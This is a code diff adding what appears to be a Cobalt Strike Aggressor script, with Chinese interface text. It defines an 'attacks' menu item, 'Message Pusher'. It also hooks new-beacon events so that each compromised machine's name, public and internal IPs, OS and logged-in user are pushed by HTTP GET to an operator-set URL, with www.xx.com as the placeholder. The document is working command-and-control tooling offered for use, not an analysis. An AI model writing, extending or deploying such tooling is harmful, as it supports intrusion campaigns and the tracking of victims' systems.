@@ -1,0 +1,44 @@
+import content.Main from: /<path>/BotPush.jar;
+#local('$protcol $boturl $botparam');
+sub setup_setting {
+	local("%options");
+	%options = $3;
+	$protcol = %options['protocol'];
+	$method = %options['method'];
+	$isprivate = %options['private'];
+	$boturl = %options['url'];
+	$botparam = %options['param'];
+	$botcode = %options['encode'];
+}
+
+on beacon_initial {
+	foreach $entry (beacons()) {
+		if ($entry['id'] == $1) {
+			$is_64 = iff($entry['is64'] eq '1', "_64", "");
+			$message = "提醒：有新beacon上线\n- 名称: $entry['computer']\n- 公网: $entry['external']\n- 内网: $entry['internal']\n- 系统: $entry['os'] $entry['ver'] $entry['barch'] $+ $is_64\n- 用户: $entry['user']";
+			$push = [new Main];
+			[$push setValue: $protcol,$method,$isprivate,$boturl,$botparam,$message,$botcode];
+			println([$push send]);
+		}
+	}
+}
+
+popup attacks {
+	item "Message Pusher" {
+		local('$dialog %defaults');
+		%defaults['url'] = "www.xx.com:80/?message=:text";
+		%defaults['param'] = ":text";
+
+		$dialog = dialog("Message Pusher Setting", %defaults, &setup_setting);
+		dialog_description($dialog, "消息推送设置面板，目前仅支持GET简单推送，需要正确设置占位符");
+		drow_combobox($dialog, "protocol", "协议: ", @("http", "https"));
+		drow_combobox($dialog, "method", "方法: ", @("GET"));
+		drow_combobox($dialog, "private", "私有证书: ", @("true", "false"));
+		drow_text($dialog, "url", "推送地址: ");
+		drow_text($dialog, "param", "占位符: ");
+		drow_combobox($dialog, "encode", "编码: ", @("url", "base64"));
+		dbutton_action($dialog, "Launch");
+		
+		dialog_show($dialog);
+	}
+}
